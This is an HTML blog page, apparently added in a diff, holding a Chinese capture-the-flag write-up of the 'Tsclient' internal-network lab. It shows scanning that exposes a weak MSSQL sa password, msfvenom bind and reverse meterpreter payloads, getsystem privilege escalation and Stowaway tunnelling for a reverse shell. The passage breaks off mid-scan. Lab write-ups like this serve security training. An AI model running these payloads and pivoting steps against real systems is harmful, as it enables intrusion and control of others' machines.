@@ -1,0 +1,1113 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/chongqing.jpg">
+  <link rel="icon" href="/img/chongqing.jpg">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="sangnigege">
+  <meta name="keywords" content="一个做事不将就的人，阻止他的只有时间">
+  
+    <meta name="description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个fl">
+<meta property="og:type" content="article">
+<meta property="og:title" content="春秋云镜 Tsclient">
+<meta property="og:url" content="http://example.com/2026/test47/index.html">
+<meta property="og:site_name" content="重庆森林不在重庆">
+<meta property="og:description" content="前言 本文所使用的工具可参考以下仓库： Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链  靶标介绍： Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个fl">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235327.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235638.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235408.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235312.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235572.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235043.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235690.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235223.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235365.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235860.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235744.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235119.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235742.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236124.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236680.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236365.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236908.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236600.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236030.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236880.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236957.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236193.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236045.png">
+<meta property="og:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152236075.png">
+<meta property="article:published_time" content="2026-04-15T10:16:15.703Z">
+<meta property="article:modified_time" content="2026-04-15T14:50:39.692Z">
+<meta property="article:author" content="sangnigege">
+<meta property="article:tag" content="春秋云镜">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235327.png">
+  
+  
+  
+  <title>春秋云镜 Tsclient - 重庆森林不在重庆</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":false},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":"TKccC2BvrQ0jKroA5aUdv8tr-gzGzoHsz","app_key":"rSHs3EnI9lT7nQwv5J7fcBnq","server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+    
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>重庆森林不在重庆</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/" target="_self">
+                <i class="iconfont icon-link-fill"></i>
+                <span>友链</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/default.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="春秋云镜 Tsclient"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2026-04-15 18:16" pubdate>
+          2026年4月15日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          6.8k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          57 分钟
+        
+      </span>
+    
+
+    
+    
+      
+        <span id="leancloud-page-views-container" class="post-meta" style="display: none">
+          <i class="iconfont icon-eye" aria-hidden="true"></i>
+          <span id="leancloud-page-views"></span> 次
+        </span>
+        
+      
+      
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">春秋云镜 Tsclient</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
+<p>本文所使用的工具可参考以下仓库：</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/sangnigege/Awesome_Pentest_Tools">Awesome_Pentest_Tools: 一站式渗透测试与红队工具合集，旨在帮助渗透测试人员打造自己的工具链</a></p>
+</blockquote>
+<p><em>靶标介绍：</em></p>
+<p>Tsclient是一套难度为中等的靶场环境，完成该挑战可以帮助玩家了解内网渗透中的代理转发、内网扫描、信息收集、特权提升以及横向移动技术方法，加强对域环境核心认证机制的理解，以及掌握域环境渗透中一些有趣的技术要点。该靶场共有3个flag，分布于不同的靶机。</p>
+<h1 id="flag1"><a href="#flag1" class="headerlink" title="flag1"></a>flag1</h1><p>指纹识别</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235327.png" srcset="/img/loading.gif" lazyload alt="image-20250801195214638"></p>
+<p>fscan扫一下子</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">┌──(matrix㉿matrix)-<span class="hljs-string">[~/Desktop/fscan_all_version]</span><br>└─$ ./fscan -h <span class="hljs-number">39</span>.<span class="hljs-number">99</span>.<span class="hljs-number">228</span>.<span class="hljs-number">12</span>                   <br><br>   ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br><span class="hljs-number">39.99.228.12:21</span> open<br><span class="hljs-number">39.99.228.12:80</span> open<br><span class="hljs-number">39.99.228.12:1433</span> open<br><span class="hljs-number">39.99.228.12:445</span> open<br><span class="hljs-string">[*]</span> alive ports len is: <span class="hljs-number">4</span><br>start vulscan<br><span class="hljs-string">[*]</span> WebTitle http://<span class="hljs-number">39</span>.<span class="hljs-number">99</span>.<span class="hljs-number">228</span>.<span class="hljs-number">12</span>      code:<span class="hljs-number">200</span> len:<span class="hljs-number">703</span>    title:IIS Windows Server<br><span class="hljs-string">[+]</span> mssql <span class="hljs-number">39</span>.<span class="hljs-number">99</span>.<span class="hljs-number">228</span>.<span class="hljs-number">12</span>:<span class="hljs-number">1433</span>:sa 1qaz!QAZ<br>已完成 <span class="hljs-number">4</span>/<span class="hljs-number">4</span><br><span class="hljs-string">[*]</span> 扫描结束,耗时: <span class="hljs-number">11</span>.17161989s<br></code></pre></td></tr></table></figure>
+
+<p>有弱密钥，MDUT连接数据库</p>
+<img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235638.png" srcset="/img/loading.gif" lazyload alt="image-20250801202815148" style="zoom:50%;" />
+
+<p>然后命令执行，如果无法执行命令，可能需要先激活插件，最上方激活组件即可</p>
+<p><img src="https://raw.githubusercontent.com/sangnigege/Cloud-Image-Hosting/main/202604152235408.png" srcset="/img/loading.gif" lazyload alt="image-20250804214357345"></p>
+<p><strong>上线msf</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfvenom -p windows/x64/meterpreter/bind_tcp LPORT=54522 -f exe -o shell22.exe<br></code></pre></td></tr></table></figure>
+
+<p>利用MDUT上传文件</p>
+<figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">C:<span class="hljs-regexp">/迅雷下载/</span>shell22.exe<br></code></pre></td></tr></table></figure>
+
+<p>连接后门</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">msfconsole<br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/bind_tcp<br><span class="hljs-built_in">set</span> RHOST 39.99.228.12<br><span class="hljs-built_in">set</span> LPORT 54522<br>run<br></code></pre></td></tr></table></figure>
+
+<p>提权</p>
+<figure class="highlight nsis"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nsis">meterpreter &gt; get<span class="hljs-params">system</span><br>...got <span class="hljs-params">system</span> via technique <span class="hljs-number">5</span> (Named Pipe Impersonation (PrintSpooler variant)).<br></code></pre></td></tr></table></figure>
+
+<p>shell获取flag1</p>
+<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livescript">C:<span class="hljs-string">\Windows\system32&gt;type</span> C:<span class="hljs-string">\Users\Administrator\flag\flag01.txt</span><br>type C:<span class="hljs-string">\Users\Administrator\flag\flag01.txt</span><br> _________  ________  ________  ___       ___  _______   ________   _________   <br>|<span class="hljs-string">\___</span>   ___<span class="hljs-string">\\</span>   ____<span class="hljs-string">\|\</span>   ____<span class="hljs-string">\|\</span>  <span class="hljs-string">\</span>     |<span class="hljs-string">\</span>  <span class="hljs-string">\|\</span>  ___ <span class="hljs-string">\</span> |<span class="hljs-string">\</span>   ___  <span class="hljs-string">\|\___</span>   ___<span class="hljs-string">\</span> <br><span class="hljs-string">\|___</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\___|\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\___|\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>   __/|<span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\|___</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_|</span> <br>     <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span> <span class="hljs-string">\_____</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>    <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_|/_\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>  <br>      <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\|____|\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\____\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\____\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\_|\</span> <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\</span>  <span class="hljs-string">\</span> <br>       <span class="hljs-string">\</span> <span class="hljs-string">\__\</span>  ____<span class="hljs-string">\_\</span>  <span class="hljs-string">\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\__\</span> <span class="hljs-string">\_______\</span> <span class="hljs-string">\__\\</span> <span class="hljs-string">\__\</span>   <span class="hljs-string">\</span> <span class="hljs-string">\__\</span><br>        <span class="hljs-string">\|__|</span> |<span class="hljs-string">\_________\|_______|\|_______|\|__|\|_______|\|__|</span> <span class="hljs-string">\|__|</span>    <span class="hljs-string">\|__|</span><br>              <span class="hljs-string">\|_________|</span>                                                      <br><br><br>Getting flag01 <span class="hljs-keyword">is</span> easy, right?<br><br>flag01: flag&#123;<span class="hljs-number">7ac</span>43465-<span class="hljs-number">8f</span>1d-<span class="hljs-number">4d</span>5b-<span class="hljs-number">9a</span>7b-c0e7f65a3f0d&#125;<br><br>Maybe you should focus <span class="hljs-literal">on</span> user sessions...<br></code></pre></td></tr></table></figure>
+
+<h1 id="flag2"><a href="#flag2" class="headerlink" title="flag2"></a>flag2</h1><p><strong>上线stowaway</strong></p>
+<p>这里改一下名字</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs stylus">meterpreter &gt; upload /home/matrix/Desktop/Stowaway/windows_x64_agent<span class="hljs-selector-class">.exe</span> win_agent<span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-attr">[*]</span> Uploading  : /home/matrix/Desktop/Stowaway/windows_x64_agent<span class="hljs-selector-class">.exe</span> -&gt; win_agent<span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-attr">[*]</span> Uploaded <span class="hljs-number">2.17</span> MiB of <span class="hljs-number">2.17</span> MiB (<span class="hljs-number">100.0%</span>): /home/matrix/Desktop/Stowaway/windows_x64_agent<span class="hljs-selector-class">.exe</span> -&gt; win_agent<span class="hljs-selector-class">.exe</span><br><span class="hljs-selector-attr">[*]</span> Completed  : /home/matrix/Desktop/Stowaway/windows_x64_agent<span class="hljs-selector-class">.exe</span> -&gt; win_agent<span class="hljs-selector-class">.exe</span><br>meterpreter &gt;<br></code></pre></td></tr></table></figure>
+
+<p>连接</p>
+<figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gauss">win_agent.exe -l <span class="hljs-number">54523</span> -s <span class="hljs-keyword">matrix</span><br>./linux_x64_admin -c <span class="hljs-number">39.99</span><span class="hljs-number">.228</span><span class="hljs-number">.12</span>:<span class="hljs-number">54523</span> -s <span class="hljs-keyword">matrix</span><br></code></pre></td></tr></table></figure>
+
+<p>这里提一下stowaway端口转发实现msf反向连接</p>
+<ul>
+<li><code>backward</code>: 反向映射当前agent上的端口至admin的本地端口</li>
+</ul>
+<p>监听本地54525，然后转发到Kali的54525</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">use</span> <span class="hljs-number">0</span><br><span class="hljs-attribute">backward</span> <span class="hljs-number">54525</span> <span class="hljs-number">54525</span><br></code></pre></td></tr></table></figure>
+
+<p>写一个连接到本地的马，然后执行，则时候流量会被监听且转发到Kali，Kali只需要监听本地端口即可</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs routeros">msfvenom -p windows/x64/meterpreter/reverse_tcp <span class="hljs-attribute">LHOST</span>=127.0.0.1 <span class="hljs-attribute">LPORT</span>=54525 -f exe -o msf25.exe<br><br>execute -f msf25.exe<br><br>use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-built_in">set</span> LHOST 127.0.0.1<br><span class="hljs-built_in">set</span> LPORT 54525<br>exploit<br></code></pre></td></tr></table></figure>
+
+<p>成功反弹shell</p>
+<p>看看网段</p>
+<figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">ipconfig</span><br><span class="hljs-attribute"></span><br><span class="hljs-attribute">Windows IP 配置</span><br><span class="hljs-attribute">以太网适配器 以太网</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>   <span class="hljs-attribute">连接特定的 DNS 后缀 . . . . . . . </span><span class="hljs-punctuation">: </span><br>   <span class="hljs-attribute">本地链接 IPv6 地址. . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">fe80::ddf8:a19e:7ee0:c712%14</span><br>   <span class="hljs-attribute">IPv4 地址 . . . . . . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">172.22.8.18</span><br>   <span class="hljs-attribute">子网掩码  . . . . . . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">255.255.0.0</span><br>   <span class="hljs-attribute">默认网关. . . . . . . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">172.22.255.253</span><br><br><span class="hljs-attribute">隧道适配器 isatap.&#123;E309DFD0-37D7-4E89-A23A-3C61210B34EA&#125;</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>   <span class="hljs-attribute">媒体状态  . . . . . . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">媒体已断开连接</span><br>   <span class="hljs-attribute">连接特定的 DNS 后缀 . . . . . . . </span><span class="hljs-punctuation">: </span><br><span class="hljs-punctuation"></span><br><span class="hljs-attribute">隧道适配器 Teredo Tunneling Pseudo-Interface</span><span class="hljs-punctuation">:</span><br><span class="hljs-punctuation"></span><br>   <span class="hljs-attribute">媒体状态  . . . . . . . . . . . .</span><span class="hljs-punctuation"> :</span> <span class="hljs-string">媒体已断开连接</span><br>   <span class="hljs-attribute">连接特定的 DNS 后缀 . . . . . . . </span><span class="hljs-punctuation">: </span><br></code></pre></td></tr></table></figure>
+
+<p>上传fscan并扫描</p>
+<figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><code class="hljs accesslog">C:/迅雷下载/fscan.exe -h <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>/<span class="hljs-number">24</span><br> ___                              _    <br>  / _ \     ___  ___ _ __ __ _  ___| | __ <br> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /<br>/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    <br>\____/     |___/\___|_|  \__,_|\___|_|\_\   <br>                     fscan version: <span class="hljs-number">1</span>.<span class="hljs-number">8</span>.<span class="hljs-number">4</span><br>start infoscan<br>trying RunIcmp2<br>The current user permissions unable to send icmp packets<br>start ping<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">15</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">18</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">31</span>     is alive<br>(icmp) Target <span class="hljs-number">172</span>.<span class="hljs-number">22</span>.<span class="hljs-number">8</span>.<span class="hljs-number">46</span>     is alive<br><span class="hljs-string">[*]</span> Icmp alive hosts len is: <span class="hljs-number">4</span><br><span class="hljs-number">172.22.8.46:445</span> open<br><span class="hljs-number">172.22.8.18:1433</span> open<br><span class="hljs-number">172.22.8.31:445</span> open<br><span class="hljs-number">172.22.8.15:445</span> open<br><span class="hljs-number">172.22.8.18:445</span> open<br><span class="hljs-number">172.22.8.46:139</span> open<br><span class="hljs-number">172.22.8.31:139</span> open<br><span class="hljs-number">172.22.8.18:139</span> open<br><span class="hljs-number">172.22.8.15:139</span> open<br><span 